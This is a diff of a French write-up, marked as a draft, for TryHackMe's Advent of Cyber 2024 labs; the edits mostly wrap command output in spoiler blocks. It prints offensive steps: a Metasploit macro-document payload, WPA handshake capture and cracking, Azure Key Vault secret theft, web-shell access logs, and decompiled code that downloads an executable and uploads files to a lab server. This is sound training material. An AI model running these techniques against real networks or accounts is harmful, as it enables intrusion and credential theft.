@@ -5,11 +5,11 @@ style: border
 color: thm
 comments: false
 description: Calendrier de l'avent de la Cyber 2024
-modified: 13/02/2025
+modified: 20/03/2025
 ---
 Lien vers l'épreuve : <https://tryhackme.com/room/adventofcyber2024>
 
->13/02/2025 : Ce compte-rendu est actuellement à l'état de brouillon. A partir du jour 19, la méthodologie n'est pas rédigée.
+>20/03/2025 : Ce compte-rendu est actuellement à l'état de brouillon. A partir du jour 19, la méthodologie n'est pas rédigée.
 
 <div class="container">
     <div class="row">
@@ -801,7 +801,7 @@ aoc\glitch
 Nous passons le shell de base (`cmd`) en PowerShell, puis nous navigons vers le flag et nous l'ouvrons :
 
 ```powershell
-PS C:\Users\glitch> Get-ChildItem
+Get-ChildItem
 
     Directory: C:\Users\glitch
 
@@ -822,8 +822,8 @@ d-r---        10/3/2024  10:56 PM                Searches
 d-r---        10/3/2024  10:56 PM                Videos                                                                
 
 
-PS C:\Users\glitch> Set-Location .\Desktop
-PS C:\Users\glitch\Desktop> Get-ChildItem
+Set-Location .\Desktop
+Get-ChildItem
 
     Directory: C:\Users\glitch\Desktop
 
@@ -835,9 +835,8 @@ Mode                LastWriteTime         Length Name
 -a----        10/3/2024   2:22 PM             26 flag.txt                                                              
 
 
-PS C:\Users\glitch\Desktop> Get-Content flag.txt
 Get-Content flag.txt
-AOC{[...expurgé...]}
+AOC{[...expurge...]}
 ```
 
 ## Jour 9 : 9 heure, rend le GRC amusant, ne le dis à personne
@@ -902,8 +901,10 @@ lport => 9000
 set filename you_w0n.docm
 filename => you_w0n.docm
 
-msf6 exploit(multi/fileformat/office_word_macro) > show options 
+msf6 exploit(multi/fileformat/office_word_macro) > show options
+```
 
+{% capture spoil %}
 Module options (exploit/multi/fileformat/office_word_macro):
 
    Name            Current Setting                     Required  Description
@@ -938,7 +939,8 @@ msf6 exploit(multi/fileformat/office_word_macro) > run
 [*] Injecting macro and other required files in document
 [*] Finalizing docm: you_w0n.docm
 [+] you_w0n.docm stored at /root/.msf4/local/you_w0n.docm
-```
+{% endcapture %}
+{% include elements/spoil.html %}
 
 > l'option `setg` (*set global*) permet de saisir les paramètres qui seront conservés, ce qui nous fera gagner du temps lors de la mise en place du *handler* à l'étape suivante.
 
@@ -1028,6 +1030,9 @@ Nous utilisons ensuite le mode scanner pour afficher les réseaux Wi-Fi accessib
 
 ```bash
 sudo iw dev wlan2 scan
+```
+
+{% capture spoil %}
 BSS 02:[...expurgé...]:00(on wlan2)
 	last seen: 488.100s [boottime]
 	TSF: 1734777765845574 usec (20078d, 10:42:45)
@@ -1052,7 +1057,8 @@ BSS 02:[...expurgé...]:00(on wlan2)
 	Extended capabilities:
 		 * Extended Channel Switching
 		 * Operating Mode Notification
-```
+{% endcapture %}
+{% include elements/spoil.html %}
 
 Nous passons à présent l'interface en mode écoute (*monitor*) afin de permettre l'analyse du réseau, même sans y être connecté.
 
@@ -1079,18 +1085,22 @@ Nous avons à présent besoin de deux instances {% include dictionary.html word=
 
 Avec la première instance, nous utilisons `airodump-ng` afin de capturer des paquets ***WPA handshake***
 
-```txt
+```bash
 sudo airodump-ng -c 6 --bssid 02:[...expurgé...]:00 -w output-file wlan2
-# Mode écoute
+```
+
+{% capture spoil %}
+#Mode écoute
 BSSID                  PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID
 
 02:[...expurgé...]:00  -28 100      631        8    0   6   54   WPA2 CCMP   PSK  MalwareM_AP  
 
-# Reçu
+#Reçu
 BSSID                  STATION                PWR   Rate    Lost    Frames  Notes  Probes
 
 02:[...expurgé...]:00  02:[...expurgé...]:00  -29    0 - 1      0        3 
-```
+{% endcapture %}
+{% include elements/spoil.html %}
 
 Nous pouvons constater qu'une machine est actuellement connectée au réseau que nous analysons.
 
@@ -1108,6 +1118,9 @@ Maintenant que nous avons intercepté le *handshake* nous pouvons tenter de craq
 
 ```bash
 sudo aircrack-ng -a 2 -b 02:[...expurgé...]:00 -w /home/glitch/rockyou.txt output*cap
+```
+
+{% capture spoil %}
 Reading packets, please wait...
 Opening output-file-04.cap
 Read 273 packets.
@@ -1132,7 +1145,8 @@ Read 273 packets.
                        6A AA 89 62 0A 6F A9 30 CB BD AA 76 12 4B 2B D0 
 
       EAPOL HMAC     : 2C 1F 19 3C B3 77 DD 9A F6 F5 0C D1 5F 3C D8 E8
-```
+{% endcapture %}
+{% include elements/spoil.html %}
 
 ## Jour 12 : Si je ne peux pas voler leur argent, je volerais leur argent
 
@@ -1283,14 +1297,15 @@ Nous ouvrons à présent le fichier contenant l'historique PowerShell du compte 
 Get-Content 'C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt'
 ```
 
-```txt
+{% capture spoil %}
 whoami
 ifconfig
 ipconfig
 ping 1.2.3.4
 ping 1.1.1.1
 [...expurgé...]
-```
+{% endcapture %}
+{% include elements/spoil.html %}
 
 Nous nous intéressons maintenant aux logs PowerShell récupérés avec Sysmon pour tenter de retrouver le mot de passe de Glitch_Malware.
 
@@ -1302,13 +1317,14 @@ Enfin nous analysons les {% include dictionary.html word="GPO" %} en place pour 
 Get-GPO -All | Where-Object { $_.ModificationTime } | Select-Object DisplayName, ModificationTime
 ```
 
-```txt
+{% capture spoil %}
 DisplayName                                ModificationTime
 -----------                                ----------------
 Default Domain Policy                      10/14/2024 12:19:28 PM
 Default Domain Controllers Policy          10/14/2024 12:17:30 PM
 Malicious GPO - [...expurgé...]            10/30/2024 9:01:36 AM
-```
+{% endcapture %}
+{% include elements/spoil.html %}
 
 ## Jour 16 : *The Wareville’s Key Vault grew three sizes that day.*
 
@@ -1322,6 +1338,9 @@ Nous trouvons dans un premier temps ce qui semble être un mot de passe dans `of
 
 ```bash
 az ad user list --filter "startsWith('wvusr-', displayName)"
+```
+
+{% capture spoil %}
 [
 [...expurgé pour brièveté...]
   {
@@ -1339,12 +1358,16 @@ az ad user list --filter "startsWith('wvusr-', displayName)"
   },
 [...expurgé pour brièveté...]
 ]
-```
+{% endcapture %}
+{% include elements/spoil.html %}
 
 En poursuivant l'analyse, nous trouvons un groupe possédant potentiellement des droits intéressants
 
 ```bash
 az ad group list
+```
+
+{% capture spoil %}
 [
   {
     "classification": null,
@@ -1359,12 +1382,16 @@ az ad group list
     [...expurgé pour brièveté...]
   }
 ]
-```
+{% endcapture %}
+{% include elements/spoil.html %}
 
 Nous trouvons que le compte `wvusr-backupware` fait partie du groupe `Secret Recovery Group` et la rubrique `officeLocation` indique également le même mot de passe qu'observé au début de notre reconnaissance.
 
 ```bash
 az ad group member list --group "Secret Recovery Group"
+```
+
+{% capture spoil %}
 [
   {
     "@odata.type": "#microsoft.graph.user",
@@ -1381,7 +1408,8 @@ az ad group member list --group "Secret Recovery Group"
     "userPrincipalName": "wvusr-backupware@aoc2024.onmicrosoft.com"
   }
 ]
-```
+{% endcapture %}
+{% include elements/spoil.html %}
 
 Nous pivotons avec succès sur le compte `wvusr-backupware`
 
@@ -1390,6 +1418,9 @@ az account clear
 Logout successful. Re-login to your initial Cloud Shell identity with 'az login --identity'. Login with a new identity with 'az login'.
 
 az login -u wvusr-backupware@aoc2024.onmicrosoft.com -p R[...expurgé...]s!
+```
+
+{% capture spoil %}
 Authentication with username and password in the command line is strongly discouraged. Use one of the recommended authentication methods based on your requirements. For more details, see https://go.microsoft.com/fwlink/?linkid=2276314
 Cloud Shell is automatically authenticated under the initial account signed-in with. Run 'az login' only if you need to use a different account
 [
@@ -1410,12 +1441,16 @@ Cloud Shell is automatically authenticated under the initial account signed-in w
     }
   }
 ]
-```
+{% endcapture %}
+{% include elements/spoil.html %}
 
 En vérifiant les droits du compte, nous pouvons constater qu'il a la possibilité de récupérer les clés du *Vault*
 
 ```bash
 az role assignment list --assignee 7d96660a[...expurgé...]1762d0cb66b7 --all
+```
+
+{% capture spoil %}
 [
   {
     [...expurgé pour brièveté...]
@@ -1434,12 +1469,16 @@ az role assignment list --assignee 7d96660a[...expurgé...]1762d0cb66b7 --all
     "updatedOn": "2024-10-14T20:26:53.771014+00:00"
   }
 ]
-```
+{% endcapture %}
+{% include elements/spoil.html %}
 
 En poursuivant l'énumération des droits, il apparaît que `wvusr-backupware` a accès au coffre-fort (*vault*) `warevillesecrets`.
 
 ```bash
 az keyvault list
+```
+
+{% capture spoil %}
 [
   {
     "id": "/subscriptions/ddd3338d-bc5a-416d-8247-1db1f5b5ff43/resourceGroups/rg-aoc-akv/providers/Microsoft.KeyVault/vaults/warevillesecrets",
@@ -1450,12 +1489,16 @@ az keyvault list
     "type": "Microsoft.KeyVault/vaults"
   }
 ]
-```
+{% endcapture %}
+{% include elements/spoil.html %}
 
 Nous pouvons ainsi récupérer le nom du secret et enfin son contenu.
 
 ```bash
 az keyvault secret list --vault-name warevillesecrets
+```
+
+{% capture spoil %}
 [
   {
     [...expurgé pour brièveté...]
@@ -1466,10 +1509,14 @@ az keyvault secret list --vault-name warevillesecrets
     "tags": {}
   }
 ]
-```
+{% endcapture %}
+{% include elements/spoil.html %}
 
 ```bash
 az keyvault secret show --vault-name warevillesecrets --name [...expurgé...]
+```
+
+{% capture spoil %}
 {
 [...expurgé pour brièveté...]
   "contentType": null,
@@ -1480,7 +1527,8 @@ az keyvault secret show --vault-name warevillesecrets --name [...expurgé...]
   "tags": {},
   "value": "W[...expurgé...]9"
 }
-```
+{% endcapture %}
+{% include elements/spoil.html %}
 
 ## Jour 17 : Il a analysé et analysé jusqu'à ce que l'analyseur soit douloureux
 
@@ -1839,7 +1887,7 @@ Le chiffrement AES-ECB étant reversible, il est possible de déchiffrer les inf
 En décompilant `WarevilleApp.exe` nous y trouvons la fonction téléchargeant et exécutant un programme :
 
 ```c#
-private void [...expurgé...]()
+private void [...expurge...]()
 {
   string address = "http://[...expurgé...].thm:8080/dw/[...expurgé...].exe";
   string text = Path.Combine(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Downloads"), "[...expurgé...].exe");
@@ -1867,9 +1915,9 @@ private static void Main(string[] args)
 {
   try
   {
-    [...expurgé pour brièveté...]
+    [...expurge pour brievete...]
     string text2 = Path.Combine(Path.GetTempPath(), "[...expurgé...].zip");
-    [...expurgé pour brièveté...]
+    [...expurge pour brievete...]
   }
 }
 ```
@@ -1897,40 +1945,60 @@ private static void UploadFileToServer(string zipFilePath)
 ![Jour 22](https://tryhackme-images.s3.amazonaws.com/user-uploads/6228f0d4ca8e57005149c3e3/room-content/6228f0d4ca8e57005149c3e3-1730975047352.png)
 
 ```bash
-tail -n 6 pod_apache2_access.log 
+tail -n 6 pod_apache2_access.log
+```
+
+{% capture spoil %}
 127.0.0.1 - - [29/Oct/2024:12:38:45 +0000] "GET /[...expurgé...].php?cmd=whoami HTTP/1.1" 200 224 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
 127.0.0.1 - - [29/Oct/2024:12:38:53 +0000] "GET /[...expurgé...].php?cmd=whoami HTTP/1.1" 200 224 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
 127.0.0.1 - - [29/Oct/2024:12:38:59 +0000] "GET /[...expurgé...].php?cmd=ls HTTP/1.1" 200 386 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
 127.0.0.1 - - [29/Oct/2024:12:39:16 +0000] "GET /[...expurgé...].php?cmd=cat+[...expurgé...].php HTTP/1.1" 200 463 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
 127.0.0.1 - - [29/Oct/2024:12:39:38 +0000] "GET /[...expurgé...].php?cmd=whoami HTTP/1.1" 200 224 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
 127.0.0.1 - - [29/Oct/2024:12:39:46 +0000] "GET /[...expurgé...].php?cmd=which+[...expurgé...] HTTP/1.1" 200 215 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
-```
+{% endcapture %}
+{% include elements/spoil.html %}
 
 ```bash
 grep -i "head" docker-registry-logs.log | cut -d " " -f1 | sort -n | uniq -c
+```
+
+{% capture spoil %}
      32 1[...expurgé...]3
      81 172.17.0.1
-```
+{% endcapture %}
+{% include elements/spoil.html %}
 
 ```bash
 grep "1[...expurgé...]3" docker-registry-logs.log | head -n 5
+```
+
+{% capture spoil %}
 1[...expurgé...]3 - - [...expurgé...        +0000] "GET /v2/ HTTP/1.1" 401 87 "" "docker/19.03.12 go/go1.13.10 git-commit/48a66213fe kernel/4.15.0-213-generic os/linux arch/amd64 UpstreamClient(Docker-Client/19.03.12 \\(linux\\))"
 1[...expurgé...]3 - - [29/Oct/2024:10:06:33 +0000] "GET /v2/ HTTP/1.1" 200 2 "" "docker/19.03.12 go/go1.13.10 git-commit/48a66213fe kernel/4.15.0-213-generic os/linux arch/amd64 UpstreamClient(Docker-Client/19.03.12 \\(linux\\))"
 1[...expurgé...]3 - - [29/Oct/2024:10:07:01 +0000] "GET /v2/ HTTP/1.1" 401 87 "" "docker/19.03.12 go/go1.13.10 git-commit/48a66213fe kernel/4.15.0-213-generic os/linux arch/amd64 UpstreamClient(Docker-Client/19.03.12 \\(linux\\))"
 1[...expurgé...]3 - - [29/Oct/2024:10:07:01 +0000] "GET /v2/wishlistweb/manifests/latest HTTP/1.1" 404 96 "" "docker/19.03.12 go/go1.13.10 git-commit/48a66213fe kernel/4.15.0-213-generic os/linux arch/amd64 UpstreamClient(Docker-Client/19.03.12 \\(linux\\))"
 1[...expurgé...]3 - - [29/Oct/2024:10:35:03 +0000] "GET /v2/ HTTP/1.1" 401 87 "" "docker/19.03.12 go/go1.13.10 git-commit/48a66213fe kernel/4.15.0-213-generic os/linux arch/amd64 UpstreamClient(Docker-Client/19.03.12 \\(linux\\))"
-```
+{% endcapture %}
+{% include elements/spoil.html %}
 
 ```bash
 grep "1[...expurgé...]3" docker-registry-logs.log | grep -i "patch" | head -n 5
+```
+
+{% capture spoil %}
 1[...expurgé...]3 - - [...expurgé...        +0000] "PATCH /v2/wishlistweb/blobs/uploads/[...expurgé...]"
 1[...expurgé...]3 - - [29/Oct/2024:12:34:31 +0000] "PATCH /v2/wishlistweb/blobs/uploads/[...expurgé...]"
-```
+{% endcapture %}
+{% include elements/spoil.html %}
 
 ```bash
 kubectl get secret pull-creds -n wareville -o jsonpath='{.data.\.dockerconfigjson}' | base64 --decode
-{"auths":{"http://docker-registry.nicetown.loc:5000":{"username":"[...expurgé...]","password":"[...expurgé...]","auth":"[...expurgé...]"}}}
 ```
+
+{% capture spoil %}
+{"auths":{"http://docker-registry.nicetown.loc:5000":{"username":"[...expurgé...]","password":"[...expurgé...]","auth":"[...expurgé...]"}}}
+{% endcapture %}
+{% include elements/spoil.html %}
 
 ## Jour 23 : *You wanna know what happens to your hashes?*
 
@@ -1940,6 +2008,9 @@ kubectl get secret pull-creds -n wareville -o jsonpath='{.data.\.dockerconfigjso
 
 ```bash
 john --format=raw-sha256 -w=/usr/share/wordlists/rockyou.txt hash1.txt --rules=wordlist
+```
+
+{% capture spoil %}
 Using default input encoding: UTF-8
 Loaded 1 password hash (Raw-SHA256 [SHA256 256/256 AVX2 8x])
 Warning: poor OpenMP scalability for this hash type, consider --fork=2
@@ -1951,12 +2022,16 @@ Enabling duplicate candidate password suppressor
 1g 0:00:00:16 DONE (2024-12-30 21:48) 0.06165g/s 2391Kp/s 2391Kc/s 2391KC/s markie182..cherrylee2
 Use the "--show --format=Raw-SHA256" options to display all of the cracked passwords reliably
 Session completed.
-```
+{% endcapture %}
+{% include elements/spoil.html %}
 
 Bonus : Avec `hashcat`
 
 ```bash
 hashcat -m 1400 'd956a72c83a895cb767bb5be8dba791395021dcece002b689cf3b5bf5aaa20ac' /usr/share/wordlists/rockyou.txt -r rules/Hashcat/best64.rule
+```
+
+{% capture spoil %}
 hashcat (v6.2.6) starting
 
 [...expurgé pour brièveté...]
@@ -1979,7 +2054,8 @@ Guess.Mod........: Rules (rules/Hashcat/best64.rule)
 
 Started: Mon Dec 30 23:50:55 2024
 Stopped: Mon Dec 30 23:50:58 2024
-```
+{% endcapture %}
+{% include elements/spoil.html %}
 
 ```bash
 pdf2john.pl private.pdf > pdf.hash
@@ -1991,7 +2067,10 @@ john --list=formats | grep -oi  pdf
 PDF
 (151 dynamic formats shown as just "dynamic_n" here)
 
-john --format=PDF -w=wordlist.txt pdf.hash --rules=single 
+john --format=PDF -w=wordlist.txt pdf.hash --rules=single
+```
+
+{% capture spoil %}
 Using default input encoding: UTF-8
 Loaded 1 password hash (PDF [MD5 SHA2 RC4/AES 32/64])
 Cost 1 (revision) is 3 for all loaded hashes
@@ -2003,20 +2082,25 @@ Enabling duplicate candidate password suppressor
 1g 0:00:00:00 DONE (2024-12-30 22:00) 4.167g/s 5066p/s 5066c/s 5066C/s mayored..afluffy
 Use the "--show --format=PDF" options to display all of the cracked passwords reliably
 Session completed.
-```
+{% endcapture %}
+{% include elements/spoil.html %}
 
 ```bash
 pdftotext private.pdf -upw [...expurgé...]
 ```
 
 ```bash
-head -n 5 private.txt 
+head -n 5 private.txt
+```
+
+{% capture spoil %}
 transactions
 
 THM{[...expurgé...]}
 date
 transaction_ref
-```
+{% endcapture %}
+{% include elements/spoil.html %}
 
 ## Jour 24 : Tu ne peux pas faire de mal à SOC-mas, Mayor Malware
 
